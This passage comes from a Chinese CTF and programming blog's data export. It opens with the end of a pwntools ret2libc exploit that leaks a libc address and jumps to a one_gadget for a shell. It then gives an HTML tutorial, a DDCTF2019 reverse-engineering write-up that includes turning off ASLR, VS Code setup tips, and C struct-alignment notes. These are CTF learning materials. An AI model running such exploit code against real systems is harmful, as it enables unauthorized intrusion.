ELF(&#39;./bof&#39;) libc = elf.libc context.arch = &#39;i386&#39; context.log_level = &#39;debug&#39; padding = 112 start_add = 0x080483E0 libc_start_main_got = elf.got[&#39;__libc_start_main&#39;] write_plt = elf.symbols[&#39;write&#39;] io.recvuntil(&#39;2015~!\\n&#39;) p = padding * &#39;\\x00&#39; + flat([write_plt,start_add,1,libc_start_main_got,0x10]) io.sendline(p) libc_start_main_add = u32(io.recv(4)) obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_add) libc_base = libc_start_main_add - obj.dump(&#39;__libc_start_main&#39;) print(hex(libc_start_main_add)) print(hex(libc_base)) io.recvuntil(&#39;2015~!\\n&#39;) rce = libc_base + 0x3a80c p = padding * &#39;\\x00&#39; + p32(rce) + padding * &#39;\\x00&#39; io.sendline(p) io.interactive() 还是本地来base库查libc的one_gadget，然后ret to rce。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"ROP","slug":"ROP","permalink":"http://chumen77.xyz/tags/ROP/"}]},{"title":"HTML 基础","slug":"HTML 基础","date":"2019-12-29T13:42:51.000Z","updated":"2020-02-28T07:52:37.000Z","comments":true,"path":"2019/12/29/HTML 基础/","link":"","permalink":"http://chumen77.xyz/2019/12/29/HTML 基础/","excerpt":"","text":"HTML 基础 HTML标题：是通过 &lt;h1&gt; - &lt;h6&gt; 标签来定义的.；其会因为数字变化而显示的字体大小变化； HTML段落：通过标签&lt;p&gt; 来定义的. HTML链接：通过标签&lt;a&gt;来定义的。 HTML图像：通过标签 &lt;img&gt; 来定义的。 HTML 文本HTML 标题标题（Heading）是通过&lt;h1&gt; - &lt;h6&gt; 标签进行定义的.&lt;h1&gt; 定义最大的标题。 &lt;h6&gt;定义最小的标题。浏览器会自动地在标题的前后添加空行。 标题很重要： 不要仅仅是为了生成粗体或大号的文本而使用标题，而是==为了用户可以通过标题来快速浏览您的网页应该将 h1 用作主标题==（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。 HTML 注释注释： 开始括号之后（左边的括号）需要紧跟一个叹号，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。。 &lt;!-- 这是一个注释 --&gt; HTML 段落浏览器会自动地在段落的前后添加空行。（&lt;/p&gt;是块级元素） HTML 水平线1：&lt;hr&gt;标签在 HTML 页面中创建水平线。 HTML 文本格式化通常用到&lt;strong&gt;&lt;em&gt;&lt;del&gt;这几个标签。 练习：&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;文本&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- &lt;h1&gt;标题1&lt;/h1&gt; &lt;h2&gt;标题2&lt;/h2&gt; &lt;h3&gt;标题3&lt;/h3&gt; &lt;h4&gt;标题4&lt;/h4&gt; &lt;h5&gt;标题5&lt;/h5&gt; &lt;h6&gt;标题6&lt;/h6&gt; --&gt; &lt;!-- &lt;h&gt;标签有大小之分 --&gt; &lt;h2&gt;五花山&lt;/h2&gt; &lt;p&gt;我家住在大山里。你知道这里的山是什么颜色的吗？&lt;/p&gt; &lt;p&gt;春天的山是绿色的，那绿色淡淡的，许多树叶刚冒出芽来，还带着嫩嫩的黄色呢。&lt;/p&gt; &lt;p&gt;夏天的山也是绿色的，那绿色浓浓的，一片片树叶，不管是大的还是小的，都像被绿油彩涂过，连雨点落上去，都给染绿了。&lt;/p&gt; &lt;p&gt;秋天的山不再是一种颜色了。下过一场秋霜有的树林变成了金黄色□好像所有的阳光都集中到那儿去了有的树林变成了杏黄色远远望去，就像枝头挂满了熟透的杏和梨；有的树林变成了火红色，风一吹，树林跳起舞来，就像一簇簇火苗在跳跃；还有的树林变得紫红紫红，跟剧场里的紫绒幕布的颜色一样。只有松柏不怕秋霜，针一样的叶子还是那么翠绿。&lt;/p&gt; &lt;p&gt;秋天的山一片金黄，一片火红，一片翠绿……人们给这五颜六色的山起了个好听的名字，叫“&lt;strong&gt;&lt;em&gt; &lt;del&gt;五花山&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;”。&lt;/p&gt; &lt;!-- 几个标签的嵌套 --&gt; &lt;strong&gt;加粗&lt;/strong&gt; &lt;em&gt;斜体&lt;/em&gt; &lt;del&gt;删除文字&lt;/del&gt;&lt;!-- &lt;span&gt;配合css&lt;/span&gt; --&gt; &lt;/body&gt; &lt;/html&gt; 效果： HTML 图像 ==HTML 图像-== ： 标签（ &lt;img&gt;）是空标签，意思是说，它只包含属性，并且没有闭合标签。 源属性（&lt;src&gt;）是图像的 URL 地址。分为本地和网上，本地图片写路径的时候注意绝对路径和相对路径（可以用../来返回 一级目录，返回几级目录就写几个它就行)。 Alt属性:alt 属性用来为图像定义一串预备的可替换的文本,在浏览器无法载入图像时,告用户图片的信息。==搜索引擎也是通过此描述来收集图片的==. 高度与宽度:height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。属性值默认单位为像素px。 练习： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;图片&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=&quot;1.png&quot; alt=&quot;chumen的qq图像&quot; title=&quot;chumen的qq图像&quot;&gt; &lt;/body&gt; &lt;/html&gt; 图片的映射目标是为了在一张图片上的某个位置点击后才可以实现某个功能。 这需要用到usemap=&quot;#diyname&quot; 然后用&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;标签来对应。 核心代码：` &lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot;&gt;\\\\` shape是选择的形状，coords是坐标，坐标确定推荐用qq的截图功能那里来确定，比如： 那这个彩色箭头指的位置就是在这个图像的（233,456）位置。 练习： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;图片的映射&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=&quot;1.png&quot; alt=&quot;&quot; usemap=&quot;#1map&quot;&gt; &lt;map name=&quot;1map&quot;&gt; &lt;area shape=&quot;circle&quot; coords=&quot;300,255,50&quot; target=&quot;_blank&quot; href=&quot;http://www.baidu.com&quot;&gt; &lt;/map&gt; &lt;/body&gt; &lt;/html&gt; 效果： HTML 超链接超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。使用标签 &lt;a&gt;来设置超文本链接。 HTML 链接语法:&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt; ,href 属性描述了链接的目标。 target 属性 :target=&quot;_blank&quot;效果就是在新窗口（空白界面）做出来 。 id 属性:id属性可用于创建在一个HTML文档书签标记,在HTML文档中插入ID: &lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt; 在HTML文档中创建一个链接到”有用的提示部分(id=”tips”）”: &lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt; 解释加补充：ID 属性名字只能有一个不可重复，且必须以==字母==开头，可以在一个界面的任何位置的内容进行设置ID，在设置完后，（&lt;a href=&quot;# &quot;&gt;），在==“#”==后加入id的名称即可跳转到你设置ID的内容处。 &lt;a name=&quot;end&quot;&gt;&lt;/a&gt; &lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt; 做锚点时，替换id的方法，作用可以实现一样！id不好用时用这个 练习：（为了方便阅读，省略了很多的&lt;br&gt;.） &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;超级链接&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;http://www.mi.com&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;1.png&quot;&gt;&lt;/a&gt; &lt;!-- /*书签标记：锚点*/ --&gt; &lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt; &lt;br id=&quot;aa&quot;&gt; &lt;br&gt; &lt;br id=&quot;miao&quot;&gt; &lt;br&gt; &lt;br&gt; &lt;br&gt; &lt;a name=&quot;miao&quot;&gt;&lt;/a&gt; &lt;br&gt; &lt;br&gt; &lt;br&gt; &lt;br&gt; &lt;a name=&quot;end&quot;&gt;&lt;/a&gt; &lt;a href=&quot;#miao&quot;&gt;miao&lt;/a&gt; &lt;/body&gt; &lt;/html&gt; HTML 列表 HTML无序列表：&lt;ul&gt;与 &lt;li&gt;其点的样式(圆圈，圆心，正方形）用css来控制&lt;ul style=&quot;list-style-type:circle&quot;&gt; HTML 有序列表 &lt;ol&gt;与&lt;li&gt; 用法和无序相似，且有序与无序之间可以互相嵌套，嵌套过程中点的形状也会自动变化。 HTML 自定义列表：这个是比较常用的，自定义列表以&lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt;开始。其不仅仅是一列项目，而是项目及其注释的组合。 &lt;dl&gt; &lt;dt&gt;Coffee&lt;/dt&gt; &lt;!-- 列表标题 --&gt; &lt;dd&gt;- black hot drink&lt;/dd&gt; &lt;!-- 其内容 --&gt; &lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;- white cold drink&lt;/dd&gt; &lt;/dl&gt; 练习： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;列表&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;ul style=&quot;list-style-type:circle&quot;&gt; &lt;li&gt;无序列表1&lt;/li&gt; &lt;li&gt;无序列表2&lt;/li&gt; &lt;li&gt;无序列表3&lt;/li&gt; &lt;li&gt;无序列表4&lt;/li&gt; &lt;/ul&gt; &lt;ol&gt; &lt;li&gt;有序列表1&lt;/li&gt; &lt;li&gt;有序列表2&lt;/li&gt; &lt;li&gt;有序列表3&lt;/li&gt; &lt;li&gt;有序列表4&lt;/li&gt; &lt;/ol&gt; &lt;dl&gt; &lt;dt&gt;标题1&lt;/dt&gt; &lt;dd&gt;自定义列表1&lt;/dd&gt; &lt;dd&gt;自定义列表2&lt;/dd&gt; &lt;dd&gt;自定义列表3&lt;/dd&gt; &lt;dd&gt;自定义列表4&lt;/dd&gt; &lt;dt&gt;标题2&lt;/dt&gt; &lt;dd&gt;自定义列表1&lt;/dd&gt; &lt;dd&gt;自定义列表2&lt;/dd&gt; &lt;dd&gt;自定义列表3&lt;/dd&gt; &lt;dd&gt;自定义列表4&lt;/dd&gt; &lt;/dl&gt; &lt;/body&gt; &lt;/html&gt; 效果： HTML表格 HTML 表格：表格由 &lt;table&gt;标签来定义。每个表格均有若干==行==（由 &lt;tr&gt; 标签定义），每行被分割为若干==单元格==（由 &lt;td&gt; 标签定义）。字母 td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。这个有利于多样化，在分清栏目后在td里放内容就ok。 HTML 边框属性:&lt;table border=&quot;1&quot;&gt;会出现表框。 HTML 表格表头:表格的表头使用 &lt;th&gt; 标签进行定义。&lt;th&gt;标签与&lt;td&gt;标签用法相似只是显示的效果不同，会有粗体居中的效果； HTML表格合并：用 colspan： 横向行 rowspan ：竖纵行。 HTML表格单元格边距的设置：类似 设置边框 直接在table标签里放入cellpadding=“自定义的数字”，就设置好了。 练习： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;表格&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;table border=&quot;1&quot;&gt; &lt;tr&gt; &lt;th&gt;部门&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;工资&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td rowspan=&quot;3&quot;&gt;开发组&lt;/td&gt; &lt;td&gt;小明&lt;/td&gt; &lt;td&gt;男&lt;/td&gt; &lt;td&gt;1w&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;小白&lt;/td&gt; &lt;td&gt;女&lt;/td&gt; &lt;td&gt;1w&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td colspan=&quot;2&quot;&gt;工资合计&lt;/td&gt; &lt;td&gt;2w&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; 效果： HTML 表单表单是一个包含表单元素的区域。表单元素是允许用户在表单中输入内容,比如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等等。 `input元素 \\\\\\\\\\` HTML 表单 - 输入元素输入标签&lt;input&gt;。 文本域文本域通过&lt;input type=&quot;text&quot;&gt; 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。 `First name: Last name: \\\\\\\\\\` 在大多数浏览器中，文本域的缺省宽度是20个字符。 密码字段&lt;input type=&quot;password&quot;&gt; 来定义 &lt;form&gt; Password: &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt; &lt;/form&gt; 单选按钮&lt;input type=&quot;radio&quot;&gt; 标签定义了表单单选框选项。 &lt;form&gt; &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;Male&lt;br&gt; &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;&gt;Female &lt;/form&gt; Name 是可以进行==分组==。想要有效果 value也少不了。 复选框&lt;input type=&quot;checkbox&quot;&gt;定义了复选框. 用户需要从若干给定的选择中选取一个或若干选项。 &lt;form&gt; &lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Bike&quot;&gt;I have a bike&lt;br&gt; &lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Car&quot;&gt;I have a car &lt;/form&gt; 类似单选三者缺一不可。 提交按钮&lt;input type=&quot;submit&quot;&gt;定义了提交按钮. &lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;&quot;&gt; Username: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt; &lt;/form&gt; ==value：提交数据到服务器的值（后台程序PHP使用）写按钮时一定要写上。 name：为控件命名，以备后台程序 ASP、PHP 使用== 练习：&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;表单&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;&quot;&gt; &lt;!-- action 中值为提交的网页 --&gt;&lt;!-- 默认为get --&gt; admin&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt; password&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt; &lt;input type=&quot;radio&quot; name=&quot;sex1&quot; value=&quot;male&quot;&gt;男 &lt;br&gt; &lt;input type=&quot;radio&quot; name=&quot;sex1&quot; value=&quot;female&quot;&gt;女 &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;中性&lt;!-- name中值一样那么其分组就一样 --&gt; &lt;!-- &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;男 &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;女 &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;中性 --&gt; &lt;br&gt; &lt;!-- 兴趣复选框 --&gt; &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;kanshu&quot;&gt; 看书 &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;xuexi&quot;&gt; 学习 &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;music&quot;&gt; 听歌 &lt;br&gt; 城市&lt;select name=&quot;city&quot;&gt; &lt;option value=&quot;shanghai&quot;&gt;上海&lt;/option&gt; &lt;option value=&quot;beijing&quot;&gt;北京&lt;/option&gt; &lt;/select&gt; &lt;input type=&quot;submit&quot; name=&quot;&quot;&gt;&lt;br&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 效果： HTML布局HTML 布局 - 使用&lt;div&gt; 元素. 可以先分为头部div 底部div 和中间的div，然后逐步添加标签进行扩充，用css来设置样式。 这中间需要用到float：left等 来控制一个div中套用的div的位置。 HTML中&lt;div&gt;元素是块级元素，它可用于组合其他 HTML元素的容器。 &lt;div&gt; 元素的另一个常见的用途是文档布局。&lt;div&gt;元素经常与 CSS 一起使用，用来布局网页。 &lt;div&gt; 元素没有特定的含义。 练习： &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;布局&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- &lt;div style=&quot;background: yellow; width: 50px;&quot;&gt; 这是个div这是个div这是个div这是个div &lt;/div&gt; --&gt; &lt;div style=&quot;background: yellow;height: 100px;&quot;&gt;导航&lt;/div&gt; &lt;div style=&quot;background: green;width: 20%; float: left; height: 300px;&quot;&gt;菜单&lt;/div&gt; &lt;di+v style=&quot;background: red;width: 80%; float: left;height: 300px;&quot;&gt;内容&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; HTML嵌套规则元素分类： 文字类块元素：p h1~h6 容器类块元素：div table tr td th form ul li ol dl dt dd 行元素:不独立成行，不可以 内容决定a img input strong em del span 特殊字符:br 规则 块元素可以嵌套行元素 &lt;div&gt;这是div &lt;a href=&quot;&quot;&gt;这是a&lt;/a&gt; &lt;/div&gt; 行元素可以嵌套行元素 &lt;a href=&quot;&quot;&gt;这是个&lt;strong〉 a&lt;/strong&gt; 行元素不可以嵌套块元素 文字类抉元素不可以嵌套块元素 容器类抉元素可以嵌套块元素","categories":[],"tags":[{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"}]},{"title":"DDCTF2019-RE-Windows Reverse","slug":"DDCTF2019-RE-Windows Reverse","date":"2019-11-17T09:38:51.000Z","updated":"2020-02-28T07:52:52.000Z","comments":true,"path":"2019/11/17/DDCTF2019-RE-Windows Reverse/","link":"","permalink":"http://chumen77.xyz/2019/11/17/DDCTF2019-RE-Windows Reverse/","excerpt":"","text":"DDCTF2019-RE-Windows Reverse前言在一个论坛里发现DDCTF这两道逆向题不是很难，就想着做一下练练手。因为最近做的都是比较老的题目，这个还算新一点的。题目下载：reverse1_final.zipreverse2_final.exe.zip reverse1_final.exe查壳可以看出是UPX壳。另外： /Volumes/data/ctf逆向题目/2019ddctf  file reverse1_final.exe reverse1_final.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed在mac终端也可以用file命令查出。 脱壳直接在终端UPX -d 脱了就可以了。 运行发现直接是运行不了的，想到是不是因为脱壳后这个需要资源修复，各种操作修复后发现还是不可以。最后查询他人wp发现这个程序开启了ASLR。需要pe工具去关闭这个程序的ASLR。然后我就去查了ASLR是怎么关闭的，且其是什么东西。 ASLRASLR通过随机放置进程关键数据区域的地址空间来防止攻击者能可靠地跳转到内存的特定位置来利用函数。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行Return-to-libc攻击。 –百度百科随后又查询到win7以后的windows系统都是有这个机制的，但因为有它的存在每次od载入时，其映像基址都是会变化的，而你有时候需要计算一些地址，基址老是变。以前我是不知道这个的，知道以后感觉这个是更加利于对程序的分析，就想着直接关闭windows7的ASLR。 关闭ASLR有两种办法。 改注册表注册表添加了一个DWORD键值项，其值为0。注意其名称和路径。 软件关闭下载EMET：https://www.updatestar.com/directdownload/emet/2258274关闭后重启即可。 成功运行程序成功运行后发现：这个估计又是字符对比。用IDA打开分析其逻辑。 IDA静态分析主函数int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+4h] [ebp-804h] char v5; // [esp+5h] [ebp-803h] char v6; // [esp+404h] [ebp-404h] char Dst; // [esp+405h] [ebp-403h] v6 = 0; memset(&amp;Dst, 0, 0x3FFu); v4 = 0; memset(&amp;v5, 0, 0x3FFu); printf(&quot;please input code:&quot;); scanf(&quot;%s&quot;, &amp;v6); sub_401000(&amp;v6); if ( !strcmp(&amp;v4, &quot;DDCTF{reverseME}&quot;) ) printf(&quot;You&#39;ve got it!!%s\\n&quot;, &amp;v4); else printf(&quot;Try again later.\\n&quot;); return 0; }代码很简单，可以看出来是在接受输入后，经过sub_401000函数分处理后与DDCTF{reverseME}对比，正确就输出You’ve got it!。 处理函数sub_401000unsigned int __cdecl sub_401000(const char *a1) { _BYTE *v1; // ecx unsigned int i; // edi unsigned int result; // eax const char *v4; // ebx i = 0; result = strlen(a1); if ( result ) { v4 = (a1 - v1); do { *v1 = byte_402FF8[v1[v4]]; ++i; ++v1; result = strlen(a1); } while ( i &lt; result ); } return result; }可以看出来输入的东西的确在这里进行了，一位位的处理。用这里的字符串进行了替换。但是跳转查看发现没什么东西，发现最下方一段不知道有什么用的字符串。静态分析至此，没什么思路了。用od来看看我们输入的字符串会变成什么样。 OD动态分析定位在这个字符串之前应该就可以看到我们输入后被处理后的字符串。在前面一个函数进行下断点，也可以清楚看到他就是我们刚刚说的加密函数这就是一个地址。然后我们输入123测试已经穿进eax。直接F8不进入函数内部，因为我们的目的就看怎么处理了我们输入的字符串。发现变成了mlk。查看下对应的ASCIL:可以明显发现处理前的字符与处理后的字符相加都等于158。 脚本解密#include &lt;iostream&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { char arr[]=&quot;DDCTF{reverseME}&quot;; for (int i = 0; i &lt; strlen(arr); i++) { arr[i]=158-arr[i]; } printf(&quot;%s&quot;,arr); }%是VC编译的字符串结束标志不用代入。 总结在某在题目中，静态分析加密函数有些困难的时候，往往没有动态分析来的快，感觉动静结合分析是很好的。","categories":[],"tags":[{"name":"Re","slug":"Re","permalink":"http://chumen77.xyz/tags/Re/"}]},{"title":"Vscode的简单调教","slug":"Vs code的简单调教","date":"2019-11-15T02:55:26.000Z","updated":"2020-02-28T07:53:02.000Z","comments":true,"path":"2019/11/15/Vs code的简单调教/","link":"","permalink":"http://chumen77.xyz/2019/11/15/Vs code的简单调教/","excerpt":"","text":"Vscode的简单调教前言VScode是比较适合自己使用的，因为非常的简洁且不臃肿，拓展性还好。并且自己常写代码是就是为了输入输出实现某些功能，基本用不到调试功能。但碍于难以配置各种环境，一直没有用上，失败了很多次。现在又学着整了一下，现在已经吃上了vscode的香。写个博客，记录一下，也可以分析下经验。 正常设置 在这里点击完设置以后，会出现：在这里可以设置vscode的各种地方，就如图中一样，需要自己探索一下，然后设置成自己想要的结果。 配置编译环境这里我只用到c/c++和Python就只记录这个了。输入C/C++在这里进行点个install。PYthon也是同样的操作。 让代码跑起来在应用商店里搜索Code Runner。这个是个神器，有了它就可以在vscode直接运行各种代码。安装好后把vscode关闭，然后重新打开。 新建个C/C++文件：然后右键是可以运行代码的。在右上角：这个小三角也可以运行代码。看下效果： 更改为终端输出我们改一下代码： #include int main() { int a; scanf(“%d”,&amp;a); printf(“hello world!”); } 在这样直接运行后发现：卡在运行过程且我们无法输入：这个解决办法就是更改为终端输出就可以了。点击配置扩展信息。下滑找到：然后打个勾就可以了。运行：发现成功了，然后看下其原理就是帮你对终端进行了cd &quot;/Volumes/data/c:c++/&quot; &amp;&amp; g++ test.cpp -o test &amp;&amp; &quot;/Volumes/data/c:c++/&quot;test这个命令的执行，发现其是用gcc进行了编译，mac是自带clang的，clang的优点挺多的，且支持语法错误的检测，然后就想着去改下让其用clang++来编译。 自定义运行逻辑还是进入这个配置里面：在settings.json中编辑: &quot;code-runner.executorMap&quot; : { &quot;java&quot;: &quot;cd $dir &amp;&amp; javac $fileName &amp;&amp; java $fileNameWithoutExt&quot;, &quot;c&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;, &quot;cpp&quot;: &quot;cd $dir &amp;&amp; clang++ $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;, &quot;objective-c&quot;: &quot;cd $dir &amp;&amp; clang++ -framework Cocoa $fileName -o $fileNameWithoutExt &amp;&amp; $dir$fileNameWithoutExt&quot;, &quot;php&quot;: &quot;php&quot;, &quot;python&quot;: &quot;python -u&quot;, &quot;ruby&quot;: &quot;ruby&quot;, }成品：直接粘贴这段代码放入这里面保存就可以了。 效果：实现我们的目的了。 测试一下Python这是直接新建的：这样就可以一个vscode运行各种代码，对于不是专门做开发，只是写脚本的，就是个福音。","categories":[],"tags":[{"name":"vscode","slug":"vscode","permalink":"http://chumen77.xyz/tags/vscode/"}]},{"title":"C语言与反汇编学习（五）","slug":"C语言与反汇编学习（五）","date":"2019-11-12T12:18:49.000Z","updated":"2020-02-28T07:53:37.000Z","comments":true,"path":"2019/11/12/C语言与反汇编学习（五）/","link":"","permalink":"http://chumen77.xyz/2019/11/12/C语言与反汇编学习（五）/","excerpt":"","text":"C语言与反汇编学习（五）前言主要是记录一下，在学习过程中认为容易忘记且重要的东西，方便以后忘了再来学习一下。集中于结构体部分以及结构体对齐的知识。 结构体的使用练习1、定义一个结构体Gamer用来存储一个游戏中的角色的信息，包括血值、等级、坐标等信息 。要求： (1) 具体包含哪些信息自由设计 (2) 但这些包含的类型中，必须要有一个成员是结构体类型。 2、定义一个函数，用来给这个结构体变量赋值.3、定义一个函数，用来显示这个结构体变量的所有成员信息. #include #include &lt;stdio.h&gt; #include &lt;string.h&gt; struct point { int x; int y; int z; }; struct Gamer { char name[20]; int level; float HP; point a; }No1; void Function() { char a[]=”xiaozhi”; for (int i = 0; i &lt;strlen(a) ; ++i) { No1.name[i]=a[i]; } No1.level = 99; No1.HP = 99.9; No1.a.x=6; No1.a.y=5; No1.a.z=9; } void Display() { printf(“name:%s level:%d HP:%f point:%d %d %d “,No1.name,No1.level,No1.HP,No1.a.x,No1.a.y,No1.a.z); } int main() { Function(); Display(); return 0; } sizeof的使用基本类型的sizeof可以使用类型，也可以使用变量例子： printf(“%d\\n”,sizeof(char));printf(“%d\\n”,sizeof(int));printf(“%d\\n”,sizeof(float));printf(“%d\\n”,sizeof(double)); int x = 10; //变量printf(“%d\\n”,sizeof(x)); 数组类型的sizeof例子： char arr1[10] = {0}; short arr2[10] = {0}; int arr3[10] = {0}; printf(&quot;%d\\n&quot;,sizeof(arr1)); //10 printf(&quot;%d\\n&quot;,sizeof(arr2)); // 20 printf(&quot;%d\\n&quot;,sizeof(arr3)); // 40 printf(&quot;%d\\n&quot;,sizeof(arr1[10])); // 1 printf(&quot;%d\\n&quot;,sizeof(arr2[10])); // 2 printf(&quot;%d\\n&quot;,sizeof(arr3[10])); //4注意其中的不同。 结构体（内存）对齐为什么要有内存对齐？本质：是要效率还是空间，二选一的结果.统称是性能，还有台移植等因素，编译器对数据结构进行了内存对齐。 pragma pack的基本用法在vc6.0++中默认值是8字节对齐。 #pragma pack( n ) 结构体。 #pragma pack( )该操作会改变一个结构体的字节对齐数，这是针对编译器的。对齐参数：n为字节对齐数，其取值为1、2、4、8，默认是8。如果这个值比结构体成员的sizeof值小，那么该成员的偏移量应该以此值为准，即是说，结构体成员的偏移量应该取二者的最小值. #pragma pack(n) struct Test { int a ; __int64 b ; char c ; }; #pragma pack() 以下是各种情况的内存对齐分析:1:1字节对齐2:2字节对齐时：3：4个字节对齐4、8个字节对齐 对齐原则：原则一：数据成员对齐规则：结构的数据成员，第一个数据成员放在offset为0的地方，以后每个数据成员存储的起始位置要从该成员大小的整数倍开始(比如int在32位机为４字节，则要从4的整数倍地址开始存储). 原则二：结构体的总大小，也就是sizeof的结果，必须是其内部最大成员的整数倍，不足的要补齐。原则三：如果一个结构里有某些结构体成员，则结构体成员要从其内部最大元素大小的整数倍地址开始存储。 (struct a里存有struct b，b里有char，int，double等元素，那b应该从8的整数倍开始存储.) 原则四：对齐参数如果比结构体成员的sizeof值小，该成员的偏移量应该以此值为准. 也就是说，结构体成员的偏移量应该取二者的最小值. 由浅入深，分析内存对齐原则后内存到底是怎么分配的 案例分析一：struct Test { char a; int b ; }; sizeof(Test) =1+3（补齐的）+4=8(其中最大的4的整倍数) 案例二分析：struct Test { int a ; __int64 b ; char c ; }; sizeof(Test) =4+4（补齐的）+8+1+7（补齐的）=24(其中最大的8的整倍数) 案例三分析：struct Test { int a ; __int64 b ; char c ; char d ; }; sizeof(Test) =4+4（补齐的）+8+1+1+6（补齐的）=24(其中最大的8的整倍数) 案例四分析：struct S1 { char c; double i; }; sizeof(S1) =1+7（补齐的）+8=16(其中最大的8的整倍数) 案例五分析：struct S2 { int c1; char c2[10]; }; sizeof(S2) =4+10+2（补齐的）=16(其中最大的8的整倍数) 案例六分析：struct S3 { char c1; S1 s; char c2; char c3; }; sizeof(S3) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+1+6（补齐的）=32(其中最大的8的整倍数) 案例七分析：struct S4 { char c1; S1 s; char c2; double c3; }; sizeof(S4) =1+7+1（s中的char c）+7（补齐的）+8（s中的double）+1+7（补齐的）+8=40(其中最大的8的整倍数)","categories":[],"tags":[{"name":"c与汇编","slug":"c与汇编","permalink":"http://chumen77.xyz/tags/c与汇编/"}]},{"title":"Xctf\\_RE新手区WP","slug":"Xctfre_新手区wp","date":"2019-11-09T03:22:03.000Z","updated":"2020-02-28T07:55:24.000Z","comments":true,"path":"2019/11/09/Xctfre_新手区wp/","link":"","permalink":"http://chumen77.xyz/2019/11/09/Xctfre_新手区wp/","excerpt":"","text":"Xctf_RE新手区WP前言学c与反汇编学的有点疲倦了，且实际运用比较少，所以最近一周刷了很多的Re入门题，巩固知识且熟悉下ctf中的RE题目。 